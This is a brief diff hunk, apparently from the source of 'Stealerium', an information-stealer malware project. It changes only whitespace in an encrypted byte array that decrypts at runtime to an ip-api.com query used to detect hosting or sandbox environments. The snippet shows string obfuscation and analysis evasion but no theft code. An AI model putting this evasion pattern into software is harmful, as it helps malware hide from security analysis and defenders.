@@ -73,7 +73,7 @@ namespace Stealerium.Modules.Implant
                     var status = await client.GetStringAsync(StringsCrypt.Decrypt(new byte[]
                     {
                         145, 244, 154, 250, 238, 89, 238, 36, 197, 152,
-                        49, 235, 197, 102, 94, 163, 45, 250, 10, 
+                        49, 235, 197, 102, 94, 163, 45, 250, 10,
                         108, 175, 221, 139, 165, 121, 24
                         // http://ip-api.com/line/?fields=hosting
                     }));
